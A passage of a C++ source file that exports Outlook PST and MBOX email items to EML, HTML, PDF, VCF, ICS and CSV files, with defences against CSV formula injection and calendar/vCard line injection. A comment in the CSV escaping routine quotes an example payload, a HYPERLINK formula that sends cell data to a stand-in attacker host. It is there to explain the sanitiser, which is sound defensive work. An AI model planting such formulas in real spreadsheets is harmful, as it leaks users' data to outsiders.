// Copyright (c) 2025-2026 Randy Northrup. All rights reserved.
// SPDX-License-Identifier: AGPL-3.0-or-later

/// @file email_export_worker.cpp
/// @brief Exports email items to standard file formats (EML, VCF, ICS, CSV)

#include "sak/email_export_worker.h"

#include "sak/email_constants.h"
#include "sak/eml_writer.h"
#include "sak/html_email_writer.h"
#include "sak/io_write_utils.h"
#include "sak/layout_constants.h"
#include "sak/mbox_parser.h"
#include "sak/pdf_email_writer.h"
#include "sak/pst_parser.h"

#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QRegularExpression>
#include <QSaveFile>
#include <QSet>
#include <QTextStream>

#include <functional>
#include <memory>

namespace {

constexpr int kProgressInterval = 10;
constexpr int kMaxFilenameLength = 200;
constexpr int kCsvBodyPreviewLength = 500;
constexpr int kImportanceHigh = 2;
constexpr int kTaskStatusComplete = 2;
constexpr ushort kMinimumPrintableCodePoint = 32;
constexpr int kFirstConflictAttempt = 2;

/// True when a cell value would be interpreted as a formula by a spreadsheet
/// application (leading = + - @, or a leading tab/CR).
bool startsWithFormulaChar(const QString& value) {
    const QString trimmed = value.trimmed();
    if (trimmed.isEmpty()) {
        return false;
    }
    const QChar first = trimmed.at(0);
    return first == QLatin1Char('=') || first == QLatin1Char('+') || first == QLatin1Char('-') ||
           first == QLatin1Char('@') || first == QLatin1Char('\t') || first == QLatin1Char('\r');
}

/// Escape a value for CSV output
QString csvEscape(const QString& value, QChar delimiter) {
    QString sanitized = value;

    // Formula/CSV injection: a cell like =HYPERLINK("http://attacker/"&A1) is
    // executed when the CSV is opened in Excel/Calc. Prefix a single quote so the
    // value is forced to plain text.
    if (startsWithFormulaChar(sanitized)) {
        sanitized.prepend(QLatin1Char('\''));
    }

    if (sanitized.contains(delimiter) || sanitized.contains(QLatin1Char('"')) ||
        sanitized.contains(QLatin1Char('\n')) || sanitized.contains(QLatin1Char('\r'))) {
        QString escaped = sanitized;
        escaped.replace(QLatin1Char('"'), QStringLiteral("\"\""));
        return QLatin1Char('"') + escaped + QLatin1Char('"');
    }
    return sanitized;
}

/// Escape a value for a vCard (RFC 6350) / iCalendar (RFC 5545) TEXT property.
/// Backslash, semicolon and comma are escaped, and any CR/LF is turned into the
/// literal "\n" sequence so an embedded newline cannot terminate the property
/// line and inject a forged one (e.g. a spurious TEL/ATTENDEE property).
QString escapeCalendarText(const QString& value) {
    QString out = value;
    out.replace(QLatin1Char('\\'), QStringLiteral("\\\\"));
    out.replace(QLatin1Char(';'), QStringLiteral("\\;"));
    out.replace(QLatin1Char(','), QStringLiteral("\\,"));
    out.replace(QStringLiteral("\r\n"), QStringLiteral("\\n"));
    out.replace(QLatin1Char('\r'), QStringLiteral("\\n"));
    out.replace(QLatin1Char('\n'), QStringLiteral("\\n"));
    return out;
}

/// Strip C0 control characters (including CR/LF) so a value cannot terminate an
/// iCalendar content line or a MIME/param context.
QString stripControlChars(const QString& value) {
    QString out;
    out.reserve(value.size());
    for (const QChar ch : value) {
        if (ch.unicode() >= kMinimumPrintableCodePoint) {
            out.append(ch);
        }
    }
    return out;
}

/// Quote an iCalendar (RFC 5545) parameter value. Parameter values use a DQUOTE
/// wrapper -- NOT TEXT backslash-escaping -- and cannot themselves contain a DQUOTE,
/// so embedded quotes are dropped. Prevents a CN value from injecting extra params.
QString icsParamQuote(const QString& value) {
    QString v = stripControlChars(value);
    v.remove(QLatin1Char('"'));
    return QLatin1Char('"') + v + QLatin1Char('"');
}

/// Detect an image MIME subtype (for a vCard PHOTO TYPE) from magic bytes; empty
/// when the format is not recognized so the caller does not mislabel it.
QString detectPhotoType(const QByteArray& data) {
    if (data.startsWith("\xFF\xD8\xFF")) {
        return QStringLiteral("JPEG");
    }
    if (data.startsWith("\x89PNG")) {
        return QStringLiteral("PNG");
    }
    if (data.startsWith("GIF8")) {
        return QStringLiteral("GIF");
    }
    return {};
}

/// Format a datetime for iCalendar (DTSTART/DTEND)
QString toIcsDateTime(const QDateTime& datetime) {
    if (!datetime.isValid()) {
        return {};
    }
    return datetime.toUTC().toString(QStringLiteral("yyyyMMdd'T'HHmmss'Z'"));
}

/// Format a datetime for vCard
QString toVcardDateTime(const QDateTime& datetime) {
    if (!datetime.isValid()) {
        return {};
    }
    return datetime.toUTC().toString(QStringLiteral("yyyyMMdd'T'HHmmss'Z'"));
}

/// Check if a format is one of the CSV variants
bool isCsvFormat(sak::ExportFormat format) {
    return format == sak::ExportFormat::CsvEmails || format == sak::ExportFormat::CsvContacts ||
           format == sak::ExportFormat::CsvCalendar || format == sak::ExportFormat::CsvTasks;
}

/// Check if a format exports one file per message body.
bool isMessageFileFormat(sak::ExportFormat format) {
    return format == sak::ExportFormat::Eml || format == sak::ExportFormat::Html ||
           format == sak::ExportFormat::Text || format == sak::ExportFormat::Pdf;
}

struct ExportFormatName {
    sak::ExportFormat format;
    const char* display_name;
};

constexpr ExportFormatName kExportFormatNames[] = {
    {.format = sak::ExportFormat::Eml, .display_name = "EML"},
    {.format = sak::ExportFormat::Html, .display_name = "HTML"},
    {.format = sak::ExportFormat::Text, .display_name = "TXT"},
    {.format = sak::ExportFormat::Pdf, .display_name = "PDF"},
    {.format = sak::ExportFormat::CsvEmails, .display_name = "CSV (Emails)"},
    {.format = sak::ExportFormat::Vcf, .display_name = "VCF"},
    {.format = sak::ExportFormat::CsvContacts, .display_name = "CSV (Contacts)"},
    {.format = sak::ExportFormat::Ics, .display_name = "ICS"},
    {.format = sak::ExportFormat::CsvCalendar, .display_name = "CSV (Calendar)"},
    {.format = sak::ExportFormat::CsvTasks, .display_name = "CSV (Tasks)"},
    {.format = sak::ExportFormat::PlainTextNotes, .display_name = "TXT"},
    {.format = sak::ExportFormat::Attachments, .display_name = "Attachments"},
};

sak::ExportFormat messageFormatOrEml(sak::ExportFormat format) {
    return isMessageFileFormat(format) ? format : sak::ExportFormat::Eml;
}

void prepareMessageWriters(sak::ExportFormat format,
                           const sak::EmailExportConfig& config,
                           std::unique_ptr<sak::EmlWriter>& eml_writer,
                           std::unique_ptr<sak::HtmlEmailWriter>& html_writer,
                           std::unique_ptr<sak::PdfEmailWriter>& pdf_writer) {
    if (format == sak::ExportFormat::Eml) {
        eml_writer =
            std::make_unique<sak::EmlWriter>(config.output_path, config.prefix_with_date, false);
    }
    if (format == sak::ExportFormat::Html) {
        html_writer = std::make_unique<sak::HtmlEmailWriter>(config.output_path,
                                                             config.prefix_with_date,
                                                             false);
    }
    if (format == sak::ExportFormat::Pdf) {
        pdf_writer = std::make_unique<sak::PdfEmailWriter>(config.output_path,
                                                           config.prefix_with_date,
                                                           false);
    }
}

/// Append every item node id in a folder to `out`, paging past the per-call
/// kMaxItemsPerLoad cap so no item beyond the first page is dropped. Returns false
/// if a page read FAILED (the caller must then record a partial-export error rather
/// than trust the truncated id list); true if the folder was fully enumerated.
[[nodiscard]] bool pageFolderItemIds(PstParser* parser,
                                     uint64_t folder_id,
                                     QVector<uint64_t>& out) {
    for (int offset = 0;; offset += sak::email::kMaxItemsPerLoad) {
        auto items_result =
            parser->readFolderItems(folder_id, offset, sak::email::kMaxItemsPerLoad);
        if (!items_result.has_value()) {
            return false;  // read error: enumeration is incomplete
        }
        const auto& page = items_result.value();
        for (const auto& item : page) {
            out.append(item.node_id);
        }
        if (page.size() < sak::email::kMaxItemsPerLoad) {
            return true;  // last (short) page reached cleanly
        }
    }
}

/// Depth-first collect a folder's own id plus every descendant folder id.
void collectFolderSubtreeIds(const sak::PstFolder& folder, QVector<uint64_t>& out) {
    out.append(folder.node_id);
    for (const auto& child : folder.children) {
        collectFolderSubtreeIds(child, out);
    }
}

/// Locate a folder by node id anywhere in the hierarchy tree.
const sak::PstFolder* findFolderById(const sak::PstFolderTree& tree, uint64_t id) {
    for (const auto& folder : tree) {
        if (folder.node_id == id) {
            return &folder;
        }
        if (const auto* found = findFolderById(folder.children, id)) {
            return found;
        }
    }
    return nullptr;
}

/// Expand each requested folder id to also cover its descendant folders,
/// preserving order and dropping duplicates. Used when recurse_subfolders is set
/// so a folder export descends into sub-folders instead of stopping at the top.
QVector<uint64_t> expandWithSubfolders(const sak::PstFolderTree& tree,
                                       const QVector<uint64_t>& roots) {
    QVector<uint64_t> expanded;
    QSet<uint64_t> seen;
    for (const uint64_t root : roots) {
        QVector<uint64_t> subtree;
        if (const auto* folder = findFolderById(tree, root)) {
            collectFolderSubtreeIds(*folder, subtree);
        } else {
            subtree.append(root);
        }
        for (const uint64_t id : subtree) {
            if (!seen.contains(id)) {
                seen.insert(id);
                expanded.append(id);
            }
        }
    }
    return expanded;
}

/// Clear the RFC 5322 addressing/metadata fields that EmlWriter renders as
/// headers, so an export with eml_include_headers=false yields a body-only .eml.
void clearEmlHeaderFields(sak::PstItemDetail& item) {
    item.sender_name.clear();
    item.sender_email.clear();
    item.display_to.clear();
    item.display_cc.clear();
    item.subject.clear();
    item.message_id.clear();
    item.in_reply_to.clear();
    item.date = QDateTime();
}

/// Human-readable name for an attachment, falling back to an index-based label.
QString attachmentDisplayName(const sak::PstAttachmentInfo& att, int att_idx) {
    const QString name = att.long_filename.isEmpty() ? att.filename : att.long_filename;
    return name.isEmpty() ? QStringLiteral("attachment_%1").arg(att_idx) : name;
}

/// Whether an attachment should be extracted given the skip-inline and filter config.
bool passesAttachmentFilter(const sak::PstAttachmentInfo& att,
                            const sak::EmailExportConfig& config) {
    if (config.skip_inline_images && !att.content_id.isEmpty()) {
        return false;
    }
    if (config.attachment_filter.isEmpty()) {
        return true;
    }
    const QString name = att.long_filename.isEmpty() ? att.filename : att.long_filename;
    const QRegularExpression filter(QRegularExpression::wildcardToRegularExpression(
                                        config.attachment_filter),
                                    QRegularExpression::CaseInsensitiveOption);
    return filter.match(name).hasMatch();
}

/// Collect MBOX message indices to export. A read failure while paging the whole
/// mailbox is recorded in result.errors (and counted as a failure) so a truncated
/// export is not reported as clean (B7-27).
QVector<int> collectMboxIndices(MboxParser* parser,
                                const QVector<uint64_t>& item_ids,
                                sak::EmailExportResult& result) {
    QVector<int> indices;
    for (auto nid : item_ids) {
        indices.append(static_cast<int>(nid));
    }
    if (!indices.isEmpty()) {
        return indices;
    }
    // Page through the whole mailbox: readMessages caps each call at kMaxItemsPerLoad,
    // so a single call silently drops every message past the first page.
    for (int offset = 0;; offset += sak::email::kMaxItemsPerLoad) {
        auto messages = parser->readMessages(offset, sak::email::kMaxItemsPerLoad);
        if (!messages.has_value()) {
            result.errors.append(
                QStringLiteral("MBOX read error at offset %1; message list is incomplete")
                    .arg(offset));
            ++result.items_failed;
            break;
        }
        const auto& page = messages.value();
        for (const auto& msg : page) {
            indices.append(msg.message_index);
        }
        if (page.size() < sak::email::kMaxItemsPerLoad) {
            break;
        }
    }
    return indices;
}

sak::PstItemDetail mboxDetailAsPstItem(const sak::MboxMessageDetail& msg) {
    sak::PstItemDetail item;
    item.node_id = static_cast<uint64_t>(msg.message_index);
    item.item_type = sak::EmailItemType::Email;
    item.subject = msg.subject;
    item.sender_name = msg.from;
    item.sender_email = msg.from;
    item.display_to = msg.to;
    item.display_cc = msg.cc;
    item.display_bcc = msg.bcc;
    item.date = msg.date;
    item.message_id = msg.message_id;
    item.body_plain = msg.body_plain;
    item.body_html = msg.body_html;
    item.transport_headers = msg.raw_headers;
    item.attachments = msg.attachments;
    return item;
}

void appendTextHeader(QTextStream& stream, const QString& label, const QString& value) {
    if (!value.isEmpty()) {
        stream << label << QStringLiteral(": ") << value << "\r\n";
    }
}

/// Flush a text stream and confirm both the stream and its backing file report no
/// error. A QTextStream swallows write failures, so without this a disk-full / I/O
/// error would let a truncated CSV/TXT export return success (B7-B).
bool textStreamOk(QTextStream& stream, QFileDevice& file) {
    stream.flush();
    return stream.status() == QTextStream::Ok && file.error() == QFileDevice::NoError;
}

QString senderDisplayText(const sak::PstItemDetail& item) {
    if (item.sender_email.isEmpty()) {
        return item.sender_name;
    }
    return item.sender_name + QStringLiteral(" <") + item.sender_email + QStringLiteral(">");
}

void appendPlainTextHeaders(QTextStream& stream,
                            const sak::PstItemDetail& item,
                            int attachment_count) {
    appendTextHeader(stream, QStringLiteral("Subject"), item.subject);
    appendTextHeader(stream, QStringLiteral("From"), senderDisplayText(item));
    appendTextHeader(stream, QStringLiteral("To"), item.display_to);
    appendTextHeader(stream, QStringLiteral("Cc"), item.display_cc);
    if (item.date.isValid()) {
        appendTextHeader(stream, QStringLiteral("Date"), item.date.toString(Qt::RFC2822Date));
    }
    if (attachment_count > 0) {
        appendTextHeader(stream, QStringLiteral("Attachments"), QString::number(attachment_count));
    }
}

/// CSV field extractor type alias
using CsvFieldExtractor = std::function<QString(const sak::PstItemDetail&)>;
using CsvFieldMap = QHash<QString, CsvFieldExtractor>;

/// Register email-related CSV field extractors
void addEmailCsvFields(CsvFieldMap& map) {
    map.insert(QStringLiteral("Subject"), [](const auto& it) { return it.subject; });
    map.insert(QStringLiteral("From"), [](const auto& it) { return it.sender_email; });
    map.insert(QStringLiteral("From Name"), [](const auto& it) { return it.sender_name; });
    map.insert(QStringLiteral("To"), [](const auto& it) { return it.display_to; });
    map.insert(QStringLiteral("Cc"), [](const auto& it) { return it.display_cc; });
    map.insert(QStringLiteral("Date"), [](const auto& it) -> QString {
        if (!it.date.isValid()) {
            return {};
        }
        return it.date.toString(Qt::ISODate);
    });
    map.insert(QStringLiteral("Body Preview"),
               [](const auto& it) { return it.body_plain.left(kCsvBodyPreviewLength); });
    map.insert(QStringLiteral("Has Attachments"), [](const auto& it) -> QString {
        return it.attachments.isEmpty() ? QStringLiteral("No") : QStringLiteral("Yes");
    });
    map.insert(QStringLiteral("Importance"), [](const auto& it) -> QString {
        if (it.importance == 0) {
            return QStringLiteral("Low");
        }
        if (it.importance == kImportanceHigh) {
            return QStringLiteral("High");
        }
        return QStringLiteral("Normal");
    });
}

/// Register contact CSV field extractors
void addContactCsvFields(CsvFieldMap& map) {
    map.insert(QStringLiteral("First Name"), [](const auto& it) { return it.given_name; });
    map.insert(QStringLiteral("Last Name"), [](const auto& it) { return it.surname; });
    map.insert(QStringLiteral("Company"), [](const auto& it) { return it.company_name; });
    map.insert(QStringLiteral("Job Title"), [](const auto& it) { return it.job_title; });
    map.insert(QStringLiteral("Email"), [](const auto& it) { return it.email_address; });
    map.insert(QStringLiteral("Business Phone"), [](const auto& it) { return it.business_phone; });
    map.insert(QStringLiteral("Mobile Phone"), [](const auto& it) { return it.mobile_phone; });
    map.insert(QStringLiteral("Home Phone"), [](const auto& it) { return it.home_phone; });
}

/// Register calendar and task CSV field extractors
void addCalendarTaskCsvFields(CsvFieldMap& map) {
    map.insert(QStringLiteral("Start"), [](const auto& it) -> QString {
        if (!it.start_time.isValid()) {
            return {};
        }
        return it.start_time.toString(Qt::ISODate);
    });
    map.insert(QStringLiteral("End"), [](const auto& it) -> QString {
        if (!it.end_time.isValid()) {
            return {};
        }
        return it.end_time.toString(Qt::ISODate);
    });
    map.insert(QStringLiteral("Location"), [](const auto& it) { return it.location; });
    map.insert(QStringLiteral("All Day"), [](const auto& it) -> QString {
        return it.is_all_day ? QStringLiteral("Yes") : QStringLiteral("No");
    });
    map.insert(QStringLiteral("Due Date"), [](const auto& it) -> QString {
        if (!it.task_due_date.isValid()) {
            return {};
        }
        return it.task_due_date.toString(Qt::ISODate);
    });
    map.insert(QStringLiteral("Status"), [](const auto& it) -> QString {
        if (it.task_status == 0) {
            return QStringLiteral("Not Started");
        }
        if (it.task_status == 1) {
            return QStringLiteral("In Progress");
        }
        if (it.task_status == kTaskStatusComplete) {
            return QStringLiteral("Complete");
        }
        return QStringLiteral("Unknown");
    });
    map.insert(QStringLiteral("% Complete"), [](const auto& it) {
        return QString::number(it.task_percent_complete * sak::kPercentMaxF, 'f', 0);
    });
}

/// Validate a CSV export config. Every requested column must map to a known
/// extractor, and the delimiter must be a single ordinary character. Returns an
/// error string (empty when valid) so the caller fails closed instead of silently
/// emitting blank cells for unknown columns or a delimiter that would corrupt the
/// row structure (a quote/CR/LF) (B7-config).
QString validateCsvConfig(const QStringList& columns, QChar delimiter);

/// Build the complete CSV column->extractor dispatch table
const CsvFieldMap& csvFieldMap() {
    static const auto map = [] {
        CsvFieldMap result;
        addEmailCsvFields(result);
        addContactCsvFields(result);
        addCalendarTaskCsvFields(result);
        return result;
    }();
    return map;
}

QString validateCsvConfig(const QStringList& columns, QChar delimiter) {
    if (delimiter.isNull() || delimiter == QLatin1Char('"') || delimiter == QLatin1Char('\r') ||
        delimiter == QLatin1Char('\n')) {
        return QStringLiteral("Invalid CSV delimiter (must be a single ordinary character)");
    }
    const auto& map = csvFieldMap();
    for (const QString& col : columns) {
        if (!map.contains(col)) {
            return QStringLiteral("Unknown CSV column requested: '%1'").arg(col);
        }
    }
    return {};
}

}  // namespace

/// Append a vCard field line only if value is non-empty
static void appendVcfField(QByteArray& vcf, const char* tag, const QString& value) {
    if (!value.isEmpty()) {
        vcf += tag + escapeCalendarText(value).toUtf8() + "\r\n";
    }
}

// ============================================================================
// Construction
// ============================================================================

EmailExportWorker::EmailExportWorker(QObject* parent) : QObject(parent) {}

// ============================================================================
// PST Export
// ============================================================================

void EmailExportWorker::emitEarlyFailure(const QString& error_message) {
    sak::EmailExportResult result;
    result.errors.append(error_message);
    result.finished = QDateTime::currentDateTime();
    Q_EMIT exportComplete(result);
}

void EmailExportWorker::noteIfCancelled(sak::EmailExportResult& result) const {
    // EmailExportResult carries no dedicated cancelled flag, so record the state in
    // the error list: without this a cancelled run reports partial output as a clean
    // exportComplete and the caller cannot tell it was truncated (B7-B).
    if (m_cancelled.load()) {
        result.errors.append(
            QStringLiteral("Export was cancelled before completion; output is partial"));
    }
}

void EmailExportWorker::exportItems(PstParser* parser, const sak::EmailExportConfig& config) {
    if (parser == nullptr) {
        emitEarlyFailure(QStringLiteral("No PST/OST file open for export"));
        return;
    }
    if (config.output_path.isEmpty()) {
        emitEarlyFailure(QStringLiteral("Export output path is empty"));
        return;
    }

    m_cancelled.store(false);

    sak::EmailExportResult result;
    result.export_path = config.output_path;
    result.started = QDateTime::currentDateTime();
    result.export_format = formatDisplayName(config.format);

    const QDir output_dir(config.output_path);
    if (!output_dir.mkpath(QStringLiteral("."))) {
        emitEarlyFailure(QStringLiteral("Failed to create output directory"));
        return;
    }

    const QVector<uint64_t> item_ids = collectItemIds(parser, config, result);
    if (item_ids.isEmpty()) {
        emitEarlyFailure(QStringLiteral("No items to export"));
        return;
    }

    Q_EMIT exportStarted(static_cast<int>(item_ids.size()));
    dispatchExportFormat(parser, item_ids, config, result);
}

QVector<uint64_t> EmailExportWorker::collectItemIds(PstParser* parser,
                                                    const sak::EmailExportConfig& config,
                                                    sak::EmailExportResult& result) {
    QVector<uint64_t> item_ids = config.item_ids;
    if (!item_ids.isEmpty()) {
        return item_ids;
    }
    // Aggregate every requested folder into one pass. folder_ids (a multi-folder
    // export) takes precedence; fall back to the single folder_id. The caller
    // serializes exports and CSV/ICS write one output file, so all folders must
    // be unioned here rather than exported one call at a time.
    // Gate on has_folder, not folder_id != 0: a folder id of 0 is legitimate (the
    // MBOX root), so treating 0 as "unset" would drop a whole-folder export of it.
    QVector<uint64_t> folders = config.folder_ids;
    if (folders.isEmpty() && config.has_folder) {
        folders.append(config.folder_id);
    }
    // Honor recurse_subfolders: fold each requested folder's descendant folders
    // into the pass so sub-folder items are exported, not silently skipped.
    if (config.recurse_subfolders && !folders.isEmpty()) {
        folders = expandWithSubfolders(parser->folderTree(), folders);
    }
    for (const uint64_t folder : folders) {
        if (!pageFolderItemIds(parser, folder, item_ids)) {
            result.errors.append(
                QStringLiteral("Folder %1 read error; item list is incomplete").arg(folder));
            ++result.items_failed;
        }
    }
    return item_ids;
}

void EmailExportWorker::dispatchExportFormat(PstParser* parser,
                                             const QVector<uint64_t>& item_ids,
                                             const sak::EmailExportConfig& config,
                                             sak::EmailExportResult& result) {
    if (config.format == sak::ExportFormat::Ics) {
        exportIcsFormat(parser, item_ids, config, result);
        return;
    }
    if (isCsvFormat(config.format)) {
        exportCsvFormat(parser, item_ids, config, result);
        return;
    }
    exportPerItemFormats(parser, item_ids, config, result);
}

void EmailExportWorker::exportPerItemFormats(PstParser* parser,
                                             const QVector<uint64_t>& item_ids,
                                             const sak::EmailExportConfig& config,
                                             sak::EmailExportResult& result) {
    std::unique_ptr<sak::EmlWriter> eml_writer;
    std::unique_ptr<sak::HtmlEmailWriter> html_writer;
    std::unique_ptr<sak::PdfEmailWriter> pdf_writer;
    prepareMessageWriters(config.format, config, eml_writer, html_writer, pdf_writer);
    const PerItemWriterSet writers{.eml = eml_writer.get(),
                                   .html = html_writer.get(),
                                   .pdf = pdf_writer.get()};
    const PstItemExportContext context{
        .parser = parser, .config = config, .result = result, .writers = writers};

    for (int index = 0; index < item_ids.size(); ++index) {
        if (m_cancelled.load()) {
            break;
        }

        if (exportOnePstItem(context, item_ids[index], index)) {
            result.items_exported++;
        } else {
            result.items_failed++;
        }

        if ((index + 1) % kProgressInterval == 0) {
            Q_EMIT exportProgress(index + 1, static_cast<int>(item_ids.size()), result.total_bytes);
        }
    }

    noteIfCancelled(result);
    result.finished = QDateTime::currentDateTime();
    Q_EMIT exportComplete(result);
}

bool EmailExportWorker::exportOnePstItem(const PstItemExportContext& context,
                                         uint64_t item_id,
                                         int index) {
    auto detail = context.parser->readItemDetail(item_id);
    if (!detail.has_value()) {
        context.result.errors.append(QStringLiteral("Failed to read item NID %1").arg(item_id));
        return false;
    }

    const AttachmentCollection attachments =
        isMessageFileFormat(context.config.format)
            ? collectAttachmentData(context.parser, detail.value(), context.config, context.result)
            : AttachmentCollection{};

    // An unreadable eligible attachment makes any artifact we could write a PARTIAL
    // one. Fail closed BEFORE writing so no incomplete .eml/.html/.pdf is left on
    // disk (the specific loss is already recorded in result.errors) (B7-25).
    if (attachments.dropped > 0) {
        return false;
    }

    return writePstItemFormat(context, detail.value(), attachments.data, index);
}

bool EmailExportWorker::writePstItemFormat(
    const PstItemExportContext& context,
    const sak::PstItemDetail& detail,
    const QVector<QPair<QString, QByteArray>>& attachment_data,
    int index) {
    switch (context.config.format) {
    case sak::ExportFormat::Eml:
        return writeEml(*context.writers.eml,
                        detail,
                        attachment_data,
                        context.result.total_bytes,
                        context.config.eml_include_headers);
    case sak::ExportFormat::Html:
        return writeHtml(
            *context.writers.html, detail, attachment_data, context.result.total_bytes);
    case sak::ExportFormat::Text:
        return writePlainText({.item = detail,
                               .output_dir = context.config.output_path,
                               .index = index,
                               .attachment_data = attachment_data,
                               .save_attachments = context.config.save_attachments_with_messages,
                               .flatten_attachments = context.config.flatten_attachments},
                              context.result.total_bytes);
    case sak::ExportFormat::Pdf:
        return writePdf(*context.writers.pdf,
                        detail,
                        attachment_data,
                        context.result.total_bytes,
                        context.config.flatten_attachments);
    case sak::ExportFormat::Vcf:
        return writeVcf(detail, context.config.output_path, index);
    case sak::ExportFormat::PlainTextNotes:
        return writePlainText({.item = detail,
                               .output_dir = context.config.output_path,
                               .index = index,
                               .attachment_data = attachment_data,
                               .save_attachments = false,
                               .flatten_attachments = context.config.flatten_attachments},
                              context.result.total_bytes);
    case sak::ExportFormat::Attachments:
        return exportAttachments(
            context.parser, detail, context.config.output_path, context.config, context.result);
    default:
        return false;
    }
}

// ============================================================================
// Export Format Helpers
// ============================================================================

QString EmailExportWorker::formatDisplayName(sak::ExportFormat format) {
    for (const auto& entry : kExportFormatNames) {
        if (entry.format == format) {
            return QString::fromLatin1(entry.display_name);
        }
    }
    return {};
}

void EmailExportWorker::exportIcsFormat(PstParser* parser,
                                        const QVector<uint64_t>& item_ids,
                                        const sak::EmailExportConfig& config,
                                        sak::EmailExportResult& result) {
    QVector<sak::PstItemDetail> events;
    for (int index = 0; index < item_ids.size(); ++index) {
        if (m_cancelled.load()) {
            break;
        }
        auto detail = parser->readItemDetail(item_ids[index]);
        if (!detail.has_value()) {
            // A dropped item is a partial export: surface it and count it as failed
            // rather than silently reporting the remaining items as a clean run (B7-B).
            result.errors.append(QStringLiteral("Failed to read item NID %1").arg(item_ids[index]));
            ++result.items_failed;
            continue;
        }
        if (detail.value().item_type == sak::EmailItemType::Calendar) {
            events.append(detail.value());
        }
    }
    const QString ics_path = config.output_path + QStringLiteral("/calendar_export.ics");
    if (writeIcs(events, ics_path)) {
        result.items_exported += static_cast<int>(events.size());
    } else {
        result.items_failed += static_cast<int>(events.size());
        result.errors.append(QStringLiteral("Failed to write ICS file"));
    }
    noteIfCancelled(result);
    result.finished = QDateTime::currentDateTime();
    Q_EMIT exportComplete(result);
}

void EmailExportWorker::exportCsvFormat(PstParser* parser,
                                        const QVector<uint64_t>& item_ids,
                                        const sak::EmailExportConfig& config,
                                        sak::EmailExportResult& result) {
    QVector<sak::PstItemDetail> items;
    for (int index = 0; index < item_ids.size(); ++index) {
        if (m_cancelled.load()) {
            break;
        }
        auto detail = parser->readItemDetail(item_ids[index]);
        if (detail.has_value()) {
            items.append(detail.value());
        } else {
            // A dropped item is a partial export: surface it and count it as failed
            // rather than reporting only the readable rows as a clean run (B7-B).
            result.errors.append(QStringLiteral("Failed to read item NID %1").arg(item_ids[index]));
            ++result.items_failed;
        }
        if ((index + 1) % kProgressInterval == 0) {
            Q_EMIT exportProgress(index + 1, static_cast<int>(item_ids.size()), 0);
        }
    }

    QStringList columns = config.csv_columns;
    if (columns.isEmpty()) {
        columns = defaultCsvColumns(config.format);
    }

    const QString csv_name = csvFilename(config.format);
    const QString csv_path = config.output_path + QLatin1Char('/') + csv_name;

    // Reject a malformed config BEFORE writing rather than coerce unknown columns to
    // blank cells or accept a structure-breaking delimiter (fail closed).
    const QString cfg_error = validateCsvConfig(columns, config.csv_delimiter);
    if (cfg_error.isEmpty() &&
        writeCsv(items, csv_path, columns, config.csv_delimiter, config.csv_include_header)) {
        result.items_exported += static_cast<int>(items.size());
        const QFileInfo fi(csv_path);
        result.total_bytes = fi.size();
    } else {
        result.items_failed += static_cast<int>(items.size());
        result.errors.append(cfg_error.isEmpty() ? QStringLiteral("Failed to write CSV file")
                                                 : cfg_error);
    }
    noteIfCancelled(result);
    result.finished = QDateTime::currentDateTime();
    Q_EMIT exportComplete(result);
}

// ============================================================================
// MBOX Export
// ============================================================================

void EmailExportWorker::exportMboxItems(MboxParser* parser, const sak::EmailExportConfig& config) {
    if (parser == nullptr) {
        emitEarlyFailure(QStringLiteral("No MBOX file open for export"));
        return;
    }
    if (config.output_path.isEmpty()) {
        emitEarlyFailure(QStringLiteral("Export output path is empty"));
        return;
    }
    // Fail closed instead of silently coercing an unsupported request to EML: MBOX
    // export only produces per-message files (EML/HTML/TXT/PDF). A CSV/ICS/VCF
    // request here is a caller error and must be surfaced, not reinterpreted.
    if (!isMessageFileFormat(config.format)) {
        emitEarlyFailure(
            QStringLiteral("MBOX export supports only per-message formats (EML, HTML, TXT, PDF)"));
        return;
    }

    m_cancelled.store(false);

    sak::EmailExportResult result;
    result.export_path = config.output_path;
    result.started = QDateTime::currentDateTime();
    const auto effective_format = messageFormatOrEml(config.format);
    result.export_format = formatDisplayName(effective_format) + QStringLiteral(" (from MBOX)");

    const QDir output_dir(config.output_path);
    if (!output_dir.mkpath(QStringLiteral("."))) {
        emitEarlyFailure(QStringLiteral("Failed to create output directory"));
        return;
    }

    QVector<int> indices = collectMboxIndices(parser, config.item_ids, result);

    Q_EMIT exportStarted(static_cast<int>(indices.size()));

    std::unique_ptr<sak::EmlWriter> eml_writer;
    std::unique_ptr<sak::HtmlEmailWriter> html_writer;
    std::unique_ptr<sak::PdfEmailWriter> pdf_writer;
    prepareMessageWriters(effective_format, config, eml_writer, html_writer, pdf_writer);
    const PerItemWriterSet writers{.eml = eml_writer.get(),
                                   .html = html_writer.get(),
                                   .pdf = pdf_writer.get()};
    const MboxItemExportContext context{.parser = parser,
                                        .config = config,
                                        .result = result,
                                        .writers = writers,
                                        .effective_format = effective_format};

    for (int idx = 0; idx < indices.size(); ++idx) {
        if (m_cancelled.load()) {
            break;
        }

        if (exportOneMboxItem(context, indices[idx], idx)) {
            result.items_exported++;
        } else {
            result.items_failed++;
        }

        if ((idx + 1) % kProgressInterval == 0) {
            Q_EMIT exportProgress(idx + 1, static_cast<int>(indices.size()), result.total_bytes);
        }
    }

    noteIfCancelled(result);
    result.finished = QDateTime::currentDateTime();
    Q_EMIT exportComplete(result);
}

bool EmailExportWorker::exportOneMboxItem(const MboxItemExportContext& context,
                                          int message_index,
                                          int loop_index) {
    auto detail = context.parser->readMessageDetail(message_index);
    if (!detail.has_value()) {
        return false;
    }

    const auto item = mboxDetailAsPstItem(detail.value());
    // Previously an empty vector, so every MBOX attachment was silently discarded.
    // Read the real bytes so message-file writers embed/save them like the PST path.
    const AttachmentCollection attachments = collectMboxAttachmentData(
        context.parser, message_index, item, context.config, context.result);
    // Fail closed before writing when an eligible attachment could not be read, so no
    // partial artifact is left on disk (the loss is recorded in result.errors).
    if (attachments.dropped > 0) {
        return false;
    }
    const auto& attachment_data = attachments.data;

    const bool written = [&]() -> bool {
        switch (context.effective_format) {
        case sak::ExportFormat::Html:
            return writeHtml(
                *context.writers.html, item, attachment_data, context.result.total_bytes);
        case sak::ExportFormat::Text:
            return writePlainText({.item = item,
                                   .output_dir = context.config.output_path,
                                   .index = loop_index,
                                   .attachment_data = attachment_data,
                                   .save_attachments = false,
                                   .flatten_attachments = context.config.flatten_attachments},
                                  context.result.total_bytes);
        case sak::ExportFormat::Pdf:
            return writePdf(*context.writers.pdf,
                            item,
                            attachment_data,
                            context.result.total_bytes,
                            context.config.flatten_attachments);
        case sak::ExportFormat::Eml:
        default:
            return writeEml(*context.writers.eml,
                            item,
                            attachment_data,
                            context.result.total_bytes,
                            context.config.eml_include_headers);
        }
    }();

    return written;
}

// ============================================================================
// Cancel
